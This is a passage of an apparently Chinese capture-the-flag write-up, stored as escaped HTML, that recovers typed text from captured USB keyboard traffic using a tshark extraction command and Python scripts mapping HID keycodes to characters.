&amp;quot;1f&amp;quot;:&amp;quot;@&amp;quot;, &amp;quot;20&amp;quot;:&amp;quot;#&amp;quot;, &amp;quot;21&amp;quot;:&amp;quot;$&amp;quot;, &amp;quot;22&amp;quot;:&amp;quot;%&amp;quot;, &amp;quot;23&amp;quot;:&amp;quot;^&amp;quot;,&amp;quot;24&amp;quot;:&amp;quot;&amp;amp;&amp;quot;,&amp;quot;25&amp;quot;:&amp;quot;*&amp;quot;,&amp;quot;26&amp;quot;:&amp;quot;(&amp;quot;,&amp;quot;27&amp;quot;:&amp;quot;)&amp;quot;,&amp;quot;28&amp;quot;:&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;,&amp;quot;29&amp;quot;:&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;,&amp;quot;2a&amp;quot;:&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;, &amp;quot;2b&amp;quot;:&amp;quot;\t&amp;quot;,&amp;quot;2c&amp;quot;:&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;,&amp;quot;2d&amp;quot;:&amp;quot;_&amp;quot;,&amp;quot;2e&amp;quot;:&amp;quot;+&amp;quot;,&amp;quot;2f&amp;quot;:&amp;quot;&amp;#123;&amp;quot;,&amp;quot;30&amp;quot;:&amp;quot;&amp;#125;&amp;quot;,&amp;quot;31&amp;quot;:&amp;quot;|&amp;quot;,&amp;quot;32&amp;quot;:&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;,&amp;quot;33&amp;quot;:&amp;quot;\&amp;quot;&amp;quot;,&amp;quot;34&amp;quot;:&amp;quot;:&amp;quot;,&amp;quot;35&amp;quot;:&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;,&amp;quot;36&amp;quot;:&amp;quot;&amp;lt;&amp;quot;,&amp;quot;37&amp;quot;:&amp;quot;&amp;gt;&amp;quot;,&amp;quot;38&amp;quot;:&amp;quot;?&amp;quot;,&amp;quot;39&amp;quot;:&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;,&amp;quot;3a&amp;quot;:&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;,&amp;quot;3b&amp;quot;:&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;, &amp;quot;3c&amp;quot;:&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;,&amp;quot;3d&amp;quot;:&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;,&amp;quot;3e&amp;quot;:&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;,&amp;quot;3f&amp;quot;:&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;,&amp;quot;40&amp;quot;:&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;,&amp;quot;41&amp;quot;:&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;,&amp;quot;42&amp;quot;:&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;,&amp;quot;43&amp;quot;:&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;,&amp;quot;44&amp;quot;:&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;,&amp;quot;45&amp;quot;:&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nums = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys = open(&amp;#x27;usbdata.txt&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for line in keys:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #print(line)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         continue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nums.append(line[0:2]+line[4:6]) #取一、三字节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #print(nums)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;output = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for n in nums:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if n[2:4] == &amp;quot;00&amp;quot; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        continue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if n[2:4] in normalKeys:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if n[0:2]==&amp;quot;02&amp;quot;: #表示按下了shift&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output += shiftKeys [n[2:4]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output += normalKeys [n[2:4]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        output += &amp;#x27;[unknown]&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;#x27;output :&amp;#x27; + output)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到 flag&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YSwXyswom6ICBpyL.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二&#34;&gt;#&lt;/a&gt; 二&lt;/h3&gt;
&lt;p&gt;当然也可以和鼠标流量一样用脚本先把多余的剔除并且删除空行并使用冒号分隔&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info = &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali下运行：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tshark -r usb.pcap -T fields -e usb.capdata &amp;gt; usbdata.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;提取流量包信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(info)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f_data = input(&amp;quot;请输入带处理txt文件的路径：&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shujian = int(input(&amp;quot;鼠标流量信息请输入8，键盘流量请输入16：&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = open(f_data, &amp;#x27;r&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 整理到out.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with open(&amp;#x27;out.txt&amp;#x27;, &amp;#x27;w&amp;#x27;) as f_out:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in f.readlines():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = i.strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 鼠标流量长度为8 ，键盘流量长度为16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if len(s) == shujian:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # 鼠标流量长度为8 ，键盘流量长度为16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ns = &amp;quot;:&amp;quot;.join(nsl)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f_out.write(ns)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f_out.write(&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同样输入路径，16&lt;br&gt;
 得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UExxnxQdQ98AhqGI.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着利用脚本对照转换&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;normalKeys = &amp;#123;&amp;quot;04&amp;quot;:&amp;quot;a&amp;quot;, &amp;quot;05&amp;quot;:&amp;quot;b&amp;quot;, &amp;quot;06&amp;quot;:&amp;quot;c&amp;quot;, &amp;quot;07&amp;quot;:&amp;quot;d&amp;quot;, &amp;quot;08&amp;quot;:&amp;quot;e&amp;quot;, &amp;quot;09&amp;quot;:&amp;quot;f&amp;quot;, &amp;quot;0a&amp;quot;:&amp;quot;g&amp;quot;, &amp;quot;0b&amp;quot;:&amp;quot;h&amp;quot;, &amp;quot;0c&amp;quot;:&amp;quot;i&amp;quot;, &amp;quot;0d&amp;quot;:&amp;quot;j&amp;quot;, &amp;quot;0e&amp;quot;:&amp;quot;k&amp;quot;, &amp;quot;0f&amp;quot;:&amp;quot;l&amp;quot;, &amp;quot;10&amp;quot;:&amp;quot;m&amp;quot;, &amp;quot;11&amp;quot;:&amp;quot;n&amp;quot;, &amp;quot;12&amp;quot;:&amp;quot;o&amp;quot;, &amp;quot;13&amp;quot;:&amp;quot;p&amp;quot;, &amp;quot;14&amp;quot;:&amp;quot;q&amp;quot;, &amp;quot;15&amp;quot;:&amp;quot;r&amp;quot;, &amp;quot;16&amp;quot;:&amp;quot;s&amp;quot;, &amp;quot;17&amp;quot;:&amp;quot;t&amp;quot;, &amp;quot;18&amp;quot;:&amp;quot;u&amp;quot;, &amp;quot;19&amp;quot;:&amp;quot;v&amp;quot;, &amp;quot;1a&amp;quot;:&amp;quot;w&amp;quot;, &amp;quot;1b&amp;quot;:&amp;quot;x&amp;quot;, &amp;quot;1c&amp;quot;:&amp;quot;y&amp;quot;, &amp;quot;1d&amp;quot;:&amp;quot;z&amp;quot;,&amp;quot;1e&amp;quot;:&amp;quot;1&amp;quot;, &amp;quot;1f&amp;quot;:&amp;quot;2&amp;quot;, &amp;quot;20&amp;quot;:&amp;quot;3&amp;quot;, &amp;quot;21&amp;quot;:&amp;quot;4&amp;quot;, &amp;quot;22&amp;quot;:&amp;quot;5&amp;quot;, &amp;quot;23&amp;quot;:&amp;quot;6&amp;quot;,&amp;quot;24&amp;quot;:&amp;quot;7&amp;quot;,&amp;quot;25&amp;quot;:&amp;quot;8&amp;quot;,&amp;quot;26&amp;quot;:&amp;quot;9&amp;quot;,&amp;quot;27&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;28&amp;quot;:&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;,&amp;quot;29&amp;quot;:&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;,&amp;quot;2a&amp;quot;:&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;, &amp;quot;2b&amp;quot;:&amp;quot;\t&amp;quot;,&amp;quot;2c&amp;quot;:&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;,&amp;quot;2d&amp;quot;:&amp;quot;-&amp;quot;,&amp;quot;2e&amp;quot;:&amp;quot;=&amp;quot;,&amp;quot;2f&amp;quot;:&amp;quot;[&amp;quot;,&amp;quot;30&amp;quot;:&amp;quot;]&amp;quot;,&amp;quot;31&amp;quot;:&amp;quot;\\&amp;quot;,&amp;quot;32&amp;quot;:&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;,&amp;quot;33&amp;quot;:&amp;quot;;&amp;quot;,&amp;quot;34&amp;quot;:&amp;quot;&amp;#x27;&amp;quot;,&amp;quot;35&amp;quot;:&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;,&amp;quot;36&amp;quot;:&amp;quot;,&amp;quot;,&amp;quot;37&amp;quot;:&amp;quot;.&amp;quot;,&amp;quot;38&amp;quot;:&amp;quot;/&amp;quot;,&amp;quot;39&amp;quot;:&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;,&amp;quot;3a&amp;quot;:&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;,&amp;quot;3b&amp;quot;:&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;, &amp;quot;3c&amp;quot;:&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;,&amp;quot;3d&amp;quot;:&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;,&amp;quot;3e&amp;quot;:&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;,&amp;quot;3f&amp;quot;:&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;,&amp;quot;40&amp;quot;:&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;,&amp;quot;41&amp;quot;:&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;,&amp;quot;42&amp;quot;:&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;,&amp;quot;43&amp;quot;:&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;,&amp;quot;44&amp;quot;:&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;,&amp;quot;45&amp;quot;:&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shiftKeys = &amp;#123;&amp;quot;04&amp;quot;:&amp;quot;A&amp;quot;, &amp;quot;05&amp;quot;:&amp;quot;B&amp;quot;, &amp;quot;06&amp;quot;:&amp;quot;C&amp;quot;, &amp;quot;07&amp;quot;:&amp;quot;D&amp;quot;, &amp;quot;08&amp;quot;:&amp;quot;E&amp;quot;, &amp;quot;09&amp;quot;:&amp;quot;F&amp;quot;, &amp;quot;0a&amp;quot;:&amp;quot;G&amp;quot;, &amp;quot;0b&amp;quot;:&amp;quot;H&amp;quot;, &amp;quot;0c&amp;quot;:&amp;quot;I&amp;quot;, &amp;quot;0d&amp;quot;:&amp;quot;J&amp;quot;, &amp;quot;0e&amp;quot;:&amp;quot;K&amp;quot;, &amp;quot;0f&amp;quot;:&amp;quot;L&amp;quot;, &amp;quot;10&amp;quot;:&amp;quot;M&amp;quot;, &amp;quot;11&amp;quot;:&amp;quot;N&amp;quot;, &amp;quot;12&amp;quot;:&amp;quot;O&amp;quot;, &amp;quot;13&amp;quot;:&amp;quot;P&amp;quot;, &amp;quot;14&amp;quot;:&amp;quot;Q&amp;quot;, &amp;quot;15&amp;quot;:&amp;quot;R&amp;quot;, &amp;quot;16&amp;quot;:&amp;quot;S&amp;quot;, &amp;quot;17&amp;quot;:&amp;quot;T&amp;quot;, &amp;quot;18&amp;quot;:&amp;quot;U&amp;quot;, &amp;quot;19&amp;quot;:&amp;quot;V&amp;quot;, &amp;quot;1a&amp;quot;:&amp;quot;W&amp;quot;, &amp;quot;1b&amp;quot;:&amp;quot;X&amp;quot;, &amp;quot;1c&amp;quot;:&amp;quot;Y&amp;quot;, &amp;quot;1d&amp;quot;:&amp;quot;Z&amp;quot;,&amp;quot;1e&amp;quot;:&amp;quot;!&amp;quot;, &amp;quot;1f&amp;quot;:&amp;quot;@&amp;quot;, &amp;quot;20&amp;quot;:&amp;quot;#&amp;quot;, &amp;quot;21&amp;quot;:&amp;quot;$&amp;quot;, &amp;quot;22&amp;quot;:&amp;quot;%&amp;quot;, &amp;quot;23&amp;quot;:&amp;quot;^&amp;quot;,&amp;quot;24&amp;quot;:&amp;quot;&amp;amp;&amp;quot;,&amp;quot;25&amp;quot;:&amp;quot;*&amp;quot;,&amp;quot;26&amp;quot;:&amp;quot;(&amp;quot;,&amp;quot;27&amp;quot;:&amp;quot;)&amp;quot;,&amp;quot;28&amp;quot;:&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;,&amp;quot;29&amp;quot;:&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;,&amp;quot;2a&amp;quot;:&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;, &amp;quot;2b&amp;quot;:&amp;quot;\t&amp;quot;,&amp;quot;2c&amp;quot;:&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;,&amp;quot;2d&amp;quot;:&amp;quot;_&amp;quot;,&amp;quot;2e&amp;quot;:&amp;quot;+&amp;quot;,&amp;quot;2f&amp;quot;:&amp;quot;&amp;#123;&amp;quot;,&amp;quot;30&amp;quot;:&amp;quot;&amp;#125;&amp;quot;,&amp;quot;31&amp;quot;:&amp;quot;|&amp;quot;,&amp;quot;32&amp;quot;:&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;,&amp;quot;33&amp;quot;:&amp;quot;\&amp;quot;&amp;quot;,&amp;quot;34&amp;quot;:&amp;quot;:&amp;quot;,&amp;quot;35&amp;quot;:&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;,&amp;quot;36&amp;quot;:&amp;quot;&amp;lt;&amp;quot;,&amp;quot;37&amp;quot;:&amp;quot;&amp;gt;&amp;quot;,&amp;quot;38&amp;quot;:&amp;quot;?&amp;quot;,&amp;quot;39&amp;quot;:&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;,&amp;quot;3a&amp;quot;:&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;,&amp;quot;3b&amp;quot;:&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;, &amp;quot;3c&amp;quot;:&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;,&amp;quot;3d&amp;quot;:&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;,&amp;quot;3e&amp;quot;:&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;,&amp;quot;3f&amp;quot;:&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;,&amp;quot;40&amp;quot;:&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;,&amp;quot;41&amp;quot;:&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;,&amp;quot;42&amp;quot;:&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;,&amp;quot;43&amp;quot;:&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;,&amp;quot;44&amp;quot;:&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;,&amp;quot;45&amp;quot;:&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;output = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys = open(&amp;#x27;out1.txt&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for line in keys:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if line[0]!=&amp;#x27;0&amp;#x27; or (line[1]!=&amp;#x27;0&amp;#x27; and line[1]!=&amp;#x27;2&amp;#x27;) or line[3]!=&amp;#x27;0&amp;#x27; or line[4]!=&amp;#x27;0&amp;#x27; or line[9]!=&amp;#x27;0&amp;#x27; or line[10]!=&amp;#x27;0&amp;#x27; or line[12]!=&amp;#x27;0&amp;#x27; or line[13]!=&amp;#x27;0&amp;#x27; or line[15]!=&amp;#x27;0&amp;#x27; or line[16]!=&amp;#x27;0&amp;#x27; or line[18]!=&amp;#x27;0&amp;#x27; or line[19]!=&amp;#x27;0&amp;#x27; or line[21]!=&amp;#x27;0&amp;#x27; or line[22]!=&amp;#x27;0&amp;#x27; or line[6:8]==&amp;quot;00&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             continue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if line[6:8] in normalKeys.keys():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&amp;#x27;2&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output += [&amp;#x27;[unknown]&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;&amp;quot;.join(output))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(len(output)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a=output.index(&amp;#x27;&amp;lt;DEL&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        del output[a]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        del output[a-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(len(output)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if output[i]==&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            flag+=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output.pop(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if flag==2:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                flag=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if flag!=0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            output[i]=output[i].upper()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except:&lt;/span&gt;&lt;br&gt;&lt;span 